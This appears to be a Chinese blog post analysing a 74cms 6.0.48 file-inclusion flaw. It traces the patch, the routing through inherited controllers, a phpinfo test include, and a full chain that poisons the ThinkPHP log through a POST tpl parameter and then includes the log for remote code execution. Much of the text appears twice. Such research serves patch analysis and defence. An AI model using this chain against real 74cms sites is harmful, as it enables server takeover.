\"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110546-70186428-3514-1.png\" alt=\"62bd36b0497018cf2b3057ed3a02fe03.png\"></p>\n<h3 id=\"怎么将payload写入文件\"><a href=\"#怎么将payload写入文件\" class=\"headerlink\" title=\"怎么将payload写入文件\"></a>怎么将payload写入文件</h3><p>上文我们一直在用一个手动上传的test.html，很显然这在实际漏洞利用过程中是不行的。我们需要想办法在目标服务器里写入一个payload。</p>\n<p>在这里笔者绕了很多弯路，尝试着在图片上传处做文章，但最后失败了。后来笔者突然想起来官方的补丁，还记得上文我们从官方补丁中得到的漏洞情报？</p>\n<p>补丁将fetch 方法中</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(!is_file($templateFile)) E(L(<span class=\"string\">&#x27;_TEMPLATE_NOT_EXIST_&#x27;</span>).<span class=\"string\">&#x27;:&#x27;</span>.$templateFile);</span><br></pre></td></tr></table></figure>\n\n<p>代码注释替换为</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(!is_file($templateFile)) E(L(<span class=\"string\">&#x27;_TEMPLATE_NOT_EXIST_&#x27;</span>));</span><br></pre></td></tr></table></figure>\n\n<p>修改之处的E()函数是用来抛出异常处理的，而补丁将$templateFile删除，正是不想让$templateFile变量值写到日志log文件中。看来payload是可以写到日志文件里的。</p>\n<p>我们回过头来，看看fetch 方法中$templateFile变量怎么控制</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110558-7795157a-3514-1.png\" alt=\"1d8138dd946fd4cc7c4f2ecca308cbb1.png\"></p>\n<p>还记得上文的分析吗？$templateFile变量其实就是请求中传入的tpl变量可以被攻击者控制。从上图来看，只要请求中传入的tpl变量不是文件，就可以将tpl变量值写入log文件。</p>\n<p>那么我们就让请求中传入的tpl变量为payload字符串，满足不是文件判断，让这个payload写到日志中</p>\n<p>实际发送如下请求控制$templateFile变量写入日志文件</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110608-7d9bf60a-3514-1.png\" alt=\"55762aad4cd5dd4ca2a9fd0bc211cd10.png\"></p>\n<p>动态调试如下：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110618-834badac-3514-1.png\" alt=\"1c6571b6153d1413b5ce3546c814146c.png\"></p>\n<p>日志被写到data/Runtime/Logs/Home/20_12_02.log，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110628-8934c08c-3514-1.png\" alt=\"896e4c9fd287cb6cf3182bdde9a1293c.png\"></p>\n<p>但有个问题：我们为什么不像上文一贯作风，使用get请求传递tpl变量值呢？因为从get请求中url会在日志文件中被url编码，而post请求则不然。因此只能发送post请求。</p>\n<p>到此，完整的利用链构造出来了，发送如下请求即可包含日志文件并执行payload</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110640-90c3f502-3514-1.png\" alt=\"308216e7581d00fbadf496dc6b2beeb8.png\"></p>\n<h2 id=\"写在最后\"><a href=\"#写在最后\" class=\"headerlink\" title=\"写在最后\"></a>写在最后</h2><p>总得来说这个漏洞并不复杂，但是却很巧妙。在此过程中遇到很多有趣是问题。</p>\n<h3 id=\"构造图片payload问题\"><a href=\"#构造图片payload问题\" class=\"headerlink\" title=\"构造图片payload问题\"></a>构造图片payload问题</h3><p>在从官方补丁中发现利用log文件写入payload思路之前，笔者花费大量时间尝试利用图片上传写入payload。因为74cms中利用了ThinkImage(也就是php-GD)对图片的渲染和处理导致webshell代码错位失效，笔者尝试了这篇文章里的思路</p>\n<p><a href=\"https://paper.seebug.org/387/#2-bypass-php-gdwebshell\">https://paper.seebug.org/387/#2-bypass-php-gdwebshell</a></p>\n<p>这下倒是成功了一半：ThinkImage出现异常抛出错误了，并没有对笔者webshell图片进行渲染和处理，这看起来太棒了。但坏消息是，因为ThinkImage抛出异常，程序并没有把笔者上传成功后存储于服务器上的图片名称抛出来，而图片名称是通过uniqid()函数生成的随机数。uniqid() 函数基于以微秒计的当前时间，生成一个唯一的ID。笔者也没有办法猜测出上传后的图片名是什么，因此作罢。</p>\n<p>这个问题与接下来的问题相关，也就是官方的补丁到底有没有效</p>\n<h3 id=\"官方第一处补丁到底有没有用\"><a href=\"#官方第一处补丁到底有没有用\" class=\"headerlink\" title=\"官方第一处补丁到底有没有用\"></a>官方第一处补丁到底有没有用</h3><p>还记得上文漏洞情报分析那里，关于第一处补丁笔者的分析吗？</p>\n<p>补丁在assign_resume_tpl方法中增添了如下代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$tpl_file = $view-&gt;parseTemplate($tpl);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!is_file($tpl_file))&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>笔者在分析漏洞之前的想法是：因为这是一个文件包含漏洞，而assign_resume_tpl方法正是这个漏洞的入口，因此如果我们传入的$tpl必定是一个文件，这样可以轻松的绕过$view-&gt;parseTemplate($tpl);（parseTemplate中进行判断，如果传入的tpl是文件则直接return）与if(!is_file($tpl_file))判断。</p>\n<p>但经过深入的漏洞分析发现，assign_resume_tpl方法不仅是文件包含漏洞的入口，也是后续将payload写入log文件的接口，通过控制assign_resume_tpl方法的tpl参数为字符串形式的payload，则这个payload将会在fetch中被写入日志文件。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110703-9e43bf64-3514-1.png\" alt=\"b7434e7d568331a5078aae73e61415ae.png\"></p>\n<p>但在assign_resume_tpl方法中增加了判断</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110719-a7791f48-3514-1.png\" alt=\"3b42f29aa73f0b0a718cbc2ebf766527.png\"></p>\n<p>$tpl_file会是payload字符串拼接.html这样的形式，接下来的if(!is_file($tpl_file))会return false，而保护程序不进入fetch。</p>\n<p>但这样真有必要吗？因为fetch中也打了补丁，经过上文对补丁的分析，就算是assign_resume_tpl方法中没有修改使得payload进入了fetch，由于补丁的原因fetch中也不会把payload写入日志了，因此这里的补丁显的没有太大必要。</p>\n<h3 id=\"官方补丁可以绕过吗\"><a href=\"#官方补丁可以绕过吗\" class=\"headerlink\" title=\"官方补丁可以绕过吗\"></a>官方补丁可以绕过吗</h3><p>经过从上面两个问题的思考，可以发现一个新的问题，那就是官方补丁是否可以绕过。通过对漏洞的了解，官方补丁实际起作用的是不让payload写入日志文件。如果真的有人有办法在图片中写入payload并上传成功，在assign_resume_tpl方法中直接包含这个文件即可利用成功。assign_resume_tpl方法中的补丁并没有限制tpl参数为文件。</p>\n<p>也就是说：要么官方补丁是可以轻松绕过的、要么通过构造图片webshell这条路走不通。具体哪个是对的，就要看看官方后续是否又出补丁绕过公告与一个新的补丁了。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>前些日子，骑士cms 官方公布了一个系统紧急风险漏洞升级通知：骑士cms 6.0.48存在一处任意文件包含漏洞，利用该漏洞对payload文件进行包含，即可造成远程代码执行漏洞。这篇文章将从漏洞公告分析开始，叙述一下笔者分析漏洞与构造payload时遇到的有趣的事情。</p>\n<h2 id=\"漏洞情报\"><a href=\"#漏洞情报\" class=\"headerlink\" title=\"漏洞情报\"></a>漏洞情报</h2><p>官方发布的系统紧急风险漏洞升级通知如下：</p>\n<p><a href=\"http://www.74cms.com/news/show-2497.html\">http://www.74cms.com/news/show-2497.html</a></p>\n<p>从官方公布的信息来看，官方修复了两个地方：</p>\n<p>1、/Application/Common/Controller/BaseController.class.php</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110015-ab36dfcc-3513-1.png\" alt=\"5aa627c04fe6466d54325608c465affe.png\"></p>\n<p>2、/ThinkPHP/Library/Think/View.class.php</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110029-b3915648-3513-1.png\" alt=\"b1d2dab890cca24c649a871e938606bb.png\"></p>\n<p>从BaseController.class.php这处补丁来看：</p>\n<p>笔者猜测漏洞多半出在了渲染简历模板的assign_resume_tpl方法中。从补丁修复上来看，增添了如下代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$tpl_file = $view-&gt;parseTemplate($tpl);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!is_file($tpl_file))&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以发现程序通过$view-&gt;parseTemplate对$tpl参数进行处理，并对处理结果$tpl_file进行is_file判断</p>\n<p>我们先跟入$view-&gt;parseTemplate看看</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110042-bb249816-3513-1.png\" alt=\"5064cfae5a0467d8dac5852f77bdad0e.png\"></p>\n<p>从上图143行的结果来看，parseTemplate中也是先通过is_file判断，然后将符合的结果返回。</p>\n<p>如果此处传入的$tpl变量是文件，那么这个文件可以顺利的通过parseTemplate与assign_resume_tpl方法中的is_file判断。回想一下，这是一个文件包含漏洞，成功利用的先前条件是恶意的文件得存在，然后被包含。这个漏洞多半是通过assign_resume_tpl方法的$tpl参数传入一个真实存在的待包含的恶意文件，而补丁先通过parseTemplate方法内的is_file判断了一次这个恶意文件是否存在，接着又在assign_resume_tpl方法通过is_file方法判断一次，成功的利用一定会使is_file为true。那assign_resume_tpl方法中增加的代码是否有作用？又有着什么作用？</p>\n<p>这个问题笔者将在文章最后介绍。</p>\n<p>接下来从第二处View.class.php这处补丁来看：</p>\n<p>补丁将fetch 方法中</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(!is_file($templateFile)) E(L(<span class=\"string\">&#x27;_TEMPLATE_NOT_EXIST_&#x27;</span>).<span class=\"string\">&#x27;:&#x27;</span>.$templateFile);</span><br></pre></td></tr></table></figure>\n\n<p>代码注释替换为</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(!is_file($templateFile)) E(L(<span class=\"string\">&#x27;_TEMPLATE_NOT_EXIST_&#x27;</span>));</span><br></pre></td></tr></table></figure>\n\n<p>在thinkphp中，E()函数是用来抛出异常处理的。可见这处的修改应该是不想让$templateFile变量值写到日志log文件中。</p>\n<p>单从这点来看，命令执行所需的payload百分百是可以通过$templateFile变量写到log文件里的,然后配合任意文件包含漏洞将这个log文件包含并执行。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>通过对漏洞情报的分析，我们差不多知道了这个漏洞的来龙去脉：</p>\n<ol>\n<li><p>通过控制fetch 方法中$templateFile变量，将payload写入log文件</p>\n</li>\n<li><p>通过assign_resume_tpl方法包含这个存在payload的log文件</p>\n</li>\n</ol>\n<p>首先我们抛开怎么把payload写入log文件，先来看看文件包含漏洞怎么回事。</p>\n<p>经过上文的猜测，我们可以通过assign_resume_tpl方法包含任意文件。首先我们要看看怎么通过请求调用assign_resume_tpl方法</p>\n<h3 id=\"如何访问assign-resume-tpl方法\"><a href=\"#如何访问assign-resume-tpl方法\" class=\"headerlink\" title=\"如何访问assign_resume_tpl方法\"></a>如何访问assign_resume_tpl方法</h3><p>assign_resume_tpl方法位于common模块base控制器下。通过对Thinkphp路由的了解，assign_resume_tpl方法多半是用如下url进行调用</p>\n<p><a href=\"http://127.0.0.1//74cms/index.php?m=common&amp;c=base&amp;a=assign_resume_tpl\">http://127.0.0.1//74cms/index.php?m=common&amp;c=base&amp;a=assign_resume_tpl</a></p>\n<p>但是实际上，程序抛出了个错误</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110055-c2bc7b0c-3513-1.png\" alt=\"9444960329c91727ea6dbec7b20fa1cb.png\"></p>\n<p>这是为什么呢？经过动态调试发现一个有意思的事情：common模块是并不能被直接调用的。原因如下：</p>\n<p>\\ThinkPHP\\Library\\Think\\Dispatcher.class.php中存在如下代码</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110105-c8b4f08e-3513-1.png\" alt=\"88af447596e2829c4411f28661b542a8.png\"></p>\n<p>从上图代码可见，因为我们common模块位于MODULE_DENY_LIST中，因此不能直接通过m=common来调用common模块。</p>\n<p>既然不能直接调用，看看有没有其他的办法调用common模块base控制器下的assign_resume_tpl方法</p>\n<p>经过研究发现，几乎所有其他的控制器，最终都继承自common模块的BaseController控制器</p>\n<p>我们拿Home模块的AbcController控制器举例,见下图：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110113-cda5eed6-3513-1.png\" alt=\"403e42518385b162d794fb3b941c6388.png\"></p>\n<p>AbcController 继承FrontendController</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110122-d2c14c94-3513-1.png\" alt=\"35b39ce4673b5ade1e2497dcb94bd0a0.png\"></p>\n<p>而FrontendController由继承了BaseController</p>\n<p>因此可以通过get请求</p>\n<p><a href=\"http://127.0.0.1/74cms/index.php?m=home&amp;c=abc&amp;a=assign_resume_tpl&amp;variable=1&amp;tpl=2\">http://127.0.0.1/74cms/index.php?m=home&amp;c=abc&amp;a=assign_resume_tpl&amp;variable=1&amp;tpl=2</a></p>\n<p>来调用BaseController下的assign_resume_tpl，并将$variable=1、$tpl=2参数传递进去</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110132-d9051f7c-3513-1.png\" alt=\"a2172aab27f3ef1b48b7af9163c7bcdd.png\"></p>\n<p>同理，Home模块下的IndexController控制器也是可以的，见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110143-df9d869e-3513-1.png\" alt=\"71a84a69aed01a87e4f773c16074ea41.png\"></p>\n<p>IndexController继承FrontendController，从上文可知，FrontendController继承BaseController。因此也可以通过get请求</p>\n<p><a href=\"http://127.0.0.1/74cms/index.php?m=home&amp;c=index&amp;a=assign_resume_tpl&amp;variable=1&amp;tpl=2\">http://127.0.0.1/74cms/index.php?m=home&amp;c=index&amp;a=assign_resume_tpl&amp;variable=1&amp;tpl=2</a></p>\n<p>来访问BaseController下的assign_resume_tpl并向该方法传参</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110154-e5bf046c-3513-1.png\" alt=\"b1d60a095246236ff99c0ff8b4210fed.png\"></p>\n<p>我们后续分析就用</p>\n<p><a href=\"http://127.0.0.1/74cms/index.php?m=home&amp;c=index&amp;a=assign_resume_tpl&amp;variable=xxx&amp;tpl=xxx\">http://127.0.0.1/74cms/index.php?m=home&amp;c=index&amp;a=assign_resume_tpl&amp;variable=xxx&amp;tpl=xxx</a></p>\n<p>这样的形式调用assign_resume_tpl方法</p>\n<p>既然我们可以通过请求向存在漏洞的assign_resume_tpl方法传参了，距离漏洞利用成功已经不远了</p>\n<h3 id=\"用测试文件触发文件包含\"><a href=\"#用测试文件触发文件包含\" class=\"headerlink\" title=\"用测试文件触发文件包含\"></a>用测试文件触发文件包含</h3><p>我们接下来”假装”在后台上传一个payload，用assign_resume_tpl这个接口包含下试试</p>\n<p>笔者手动在如下目录里放了个test.html</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110205-ecc6849c-3513-1.png\" alt=\"94f079c4ee2149e6f76d6c77c7b6d256.png\"></p>\n<p>为什么这么放呢？因为笔者在源代码里看到如下代码</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110215-f2aa2bde-3513-1.png\" alt=\"69df56ea206c171eef4e1aa43e51b167.png\"></p>\n<p>这里是74cms使用assign_resume_tpl调用word_resume.html的形式。因此笔者在测试时也在word_resume.html通目录下放置了一个test.html，其内容如下：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110225-f8990286-3513-1.png\" alt=\"11ba75fcfd04e5eae60d9888468b9048.png\"></p>\n<p>构造如下请求</p>\n<p><a href=\"http://127.0.0.1/74cms/index.php?m=home&amp;c=index&amp;a=assign_resume_tpl&amp;variable=1&amp;tpl=Emailtpl/test\">http://127.0.0.1/74cms/index.php?m=home&amp;c=index&amp;a=assign_resume_tpl&amp;variable=1&amp;tpl=Emailtpl/test</a></p>\n<p>请求将调用assign_resume_tpl方法。动态调试过程如下：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110236-fee339ae-3513-1.png\" alt=\"7cb8badae382c35d54466000a3b9441f.png\"></p>\n<p>可见此时$tpl为Emailtpl/test，get请求中参数成功传入了。</p>\n<p>我们来看一下fetch里怎么实现的</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110247-0573872e-3514-1.png\" alt=\"6b99d80ecb0f333ed74925335e0ec179.png\"></p>\n<p>程序会执行到fetch方法中的Hook::listen(‘view_parse’,$params);代码处</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110256-0b31ebc4-3514-1.png\" alt=\"c036dd43047a181f550626ad8df457c2.png\"></p>\n<p>此处代码很关键，需要详细说明下。Hook::listen(‘view_parse’,$params);这处代码的作用大体上有两个：</p>\n<ol>\n<li><p>Compiler：将模板文件经过一定解析与编译，生成缓存文件xxx.php</p>\n</li>\n<li><p>Load：通过include方法加载上一步生成的xxx.php缓存文件</p>\n</li>\n</ol>\n<p>简而言之，Hook::listen(‘view_parse’,$params);先通过Compiler将攻击者传入的模板文件编译为一个缓存文件，随后调用Load加载这个编译好的缓存文件。</p>\n<p>首先我们来看下生产缓存文件过程</p>\n<h4 id=\"Compiler\"><a href=\"#Compiler\" class=\"headerlink\" title=\"Compiler\"></a>Compiler</h4><p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110309-12ac0bf0-3514-1.png\" alt=\"31a5ff3300343ac374148a72a0dd8588.png\"></p>\n<p>从Hook::listen(‘view_parse’,$params);到compiler方法的调用链如下：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110317-17b311b6-3514-1.png\" alt=\"64891519910e85a6a42ac40810be6e9d.png\"></p>\n<p>该方法会将thinkphp的html模板中定义的标签，解析成php代码。例如模板中的”<a href=\"qscms:company_show/\">qscms:company_show/</a>”</p>\n<p>就会被解析成</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110328-1e5321e6-3514-1.png\" alt=\"8e827252d1f78414700cd630ab754864.png\"></p>\n<p>除此之外，compiler方法还会将生成的xxx.php文件头部加上一个如下代码以防止该文件被直接执行</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">if</span> (!defined(<span class=\"string\">&#x27;THINK_PATH&#x27;</span>)) <span class=\"keyword\">exit</span>();</span><br></pre></td></tr></table></figure>\n\n<p>说完compiler方法的功能后，我们来看下compiler方法是如何处理我们的test.html。</p>\n<p>test.html中的代码为<?php phpinfo(); ?>，经过解析之后，返回值见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110340-24f31b78-3514-1.png\" alt=\"b480be6cff72222f2025bbfd2b65271c.png\"></p>\n<p>上图compiler方法最终返回的是strip_whitespace($tmplContent);</p>\n<p>但strip_whitespace方法的作用是去除代码中的空白和注释，对我们的payload没什么实际意义。</p>\n<p>最终compiler方法返回值为</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">if</span> (!defined(<span class=\"string\">&#x27;THINK_PATH&#x27;</span>)) <span class=\"keyword\">exit</span>(); phpinfo();<span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>这个值被写入一个缓存文件，见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110350-2b54b5e4-3514-1.png\" alt=\"11b8744f27297b10d84cf708057b471c.png\"></p>\n<p>缓存文件位于data/Runtime/Cache/Home/8a848d32ad6f6040d5461bb8b5f65eb0.php</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110401-31cd5854-3514-1.png\" alt=\"c3c54d062abc49548ea48afbc33395f0.png\"></p>\n<p>到此为止，compiler流程已经结束，我们接下来看看加载过程</p>\n<h4 id=\"Load\"><a href=\"#Load\" class=\"headerlink\" title=\"Load\"></a>Load</h4><p>Load代码如下图所示</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110412-38878160-3514-1.png\" alt=\"7aa85eb5ad15da842e9171513ad2f150.png\"></p>\n<p>从Hook::listen(‘view_parse’,$params);到load方法的调用链如下：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110422-3e51db7c-3514-1.png\" alt=\"70c4e79c2d0424fe398992dcf91af922.png\"></p>\n<p>从第一张图可见，load代码最终会include 我们compiler流程中生产的那个data/Runtime/Cache/Home/8a848d32ad6f6040d5461bb8b5f65eb0.php缓存文件</p>\n<p>当8a848d32ad6f6040d5461bb8b5f65eb0.php被include之后，其中的恶意代码执行，见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110435-463a4388-3514-1.png\" alt=\"e3686e2479975e1820d9cf36fd58f907.png\"></p>\n<p>执行成功后，浏览器如下</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110448-4dadbe6a-3514-1.png\" alt=\"16c7ecd9e2af85defd979531b5030000.png\"></p>\n<p>等等，为什么没有phpinfo的回显呢？是不是我们phpinfo执行失败了？我们换一个payload试试，见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110457-5309232c-3514-1.png\" alt=\"af7dd12134991a71b0e6e926fb19b233.png\"></p>\n<p>这次我们执行一个生产目录的命令</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110507-5912f4dc-3514-1.png\" alt=\"db01c632208c94ae46df30b87b5cf5a7.png\"></p>\n<p>可见命令执行成功了。但是为什么phpinfo没有回显呢？</p>\n<h3 id=\"phpinfo回显哪去了\"><a href=\"#phpinfo回显哪去了\" class=\"headerlink\" title=\"phpinfo回显哪去了\"></a>phpinfo回显哪去了</h3><p>从上文看，我们使用测试文件进行包含利用成功了，但是phpinfo的回显却不见了。进过研究发现，原因还是在fetch方法里。在fetch中，注意看下图红框处代码：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110517-5eea7876-3514-1.png\" alt=\"b90c07a43bcf7ba6245dfcea7d6eecdc.png\"></p>\n<p>Fetch中的load流程，即加载payload执行phpinfo的过程在上图126行处Hook::listen(‘view_parse’,$params);代码中完成的。</p>\n<p>而在此之前，程序通过ob_start打开缓冲区，因此phpinfo输出的信息被存储于缓冲区内，而在Hook::listen代码执行之后，又通过ob_get_clean将缓冲区里的内容取出赋值给$content并删除当前输出缓冲区。因此phpinfo虽然执行成功，但回显并不会显示在浏览器页面上。</p>\n<p>如果想要获取回显，我们该怎么办呢？这其实很简单，见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110526-6430b02a-3514-1.png\" alt=\"eeedcef07c82e7e4b1dd41dcfac688d8.png\"></p>\n<p>此时生成的缓存文件如下：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110537-6ab84098-3514-1.png\" alt=\"caa1ebf3c9864c988ac9783ed13927b2.png\"></p>\n<p>虽然在include这个缓存文件之前，程序通过ob_start打开缓冲区将phpinfo的输出存到缓冲区里，但我们可以通过执行ob_flush冲刷出（送出）输出缓冲区中的内容，打印到浏览器页面上</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110546-70186428-3514-1.png\" alt=\"62bd36b0497018cf2b3057ed3a02fe03.png\"></p>\n<h3 id=\"怎么将payload写入文件\"><a href=\"#怎么将payload写入文件\" class=\"headerlink\" title=\"怎么将payload写入文件\"></a>怎么将payload写入文件</h3><p>上文我们一直在用一个手动上传的test.html，很显然这在实际漏洞利用过程中是不行的。我们需要想办法在目标服务器里写入一个payload。</p>\n<p>在这里笔者绕了很多弯路，尝试着在图片上传处做文章，但最后失败了。后来笔者突然想起来官方的补丁，还记得上文我们从官方补丁中得到的漏洞情报？</p>\n<p>补丁将fetch 方法中</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(!is_file($templateFile)) E(L(<span class=\"string\">&#x27;_TEMPLATE_NOT_EXIST_&#x27;</span>).<span class=\"string\">&#x27;:&#x27;</span>.$templateFile);</span><br></pre></td></tr></table></figure>\n\n<p>代码注释替换为</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(!is_file($templateFile)) E(L(<span class=\"string\">&#x27;_TEMPLATE_NOT_EXIST_&#x27;</span>));</span><br></pre></td></tr></table></figure>\n\n<p>修改之处的E()函数是用来抛出异常处理的，而补丁将$templateFile删除，正是不想让$templateFile变量值写到日志log文件中。看来payload是可以写到日志文件里的。</p>\n<p>我们回过头来，看看fetch 方法中$templateFile变量怎么控制</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110558-7795157a-3514-1.png\" alt=\"1d8138dd946fd4cc7c4f2ecca308cbb1.png\"></p>\n<p>还记得上文的分析吗？$templateFile变量其实就是请求中传入的tpl变量可以被攻击者控制。从上图来看，只要请求中传入的tpl变量不是文件，就可以将tpl变量值写入log文件。</p>\n<p>那么我们就让请求中传入的tpl变量为payload字符串，满足不是文件判断，让这个payload写到日志中</p>\n<p>实际发送如下请求控制$templateFile变量写入日志文件</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110608-7d9bf60a-3514-1.png\" alt=\"55762aad4cd5dd4ca2a9fd0bc211cd10.png\"></p>\n<p>动态调试如下：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110618-834badac-3514-1.png\" alt=\"1c6571b6153d1413b5ce3546c814146c.png\"></p>\n<p>日志被写到data/Runtime/Logs/Home/20_12_02.log，见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110628-8934c08c-3514-1.png\" alt=\"896e4c9fd287cb6cf3182bdde9a1293c.png\"></p>\n<p>但有个问题：我们为什么不像上文一贯作风，使用get请求传递tpl变量值呢？因为从get请求中url会在日志文件中被url编码，而post请求则不然。因此只能发送post请求。</p>\n<p>到此，完整的利用链构造出来了，发送如下请求即可包含日志文件并执行payload</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20201203110640-90c3f502-3514-1.png\" alt=\"308216e7581d00fbadf496dc6b2beeb8.png\"></p>\n<h2 id=\"写在最后\"><a href=\"#写在最后\" class=\"headerlink\" 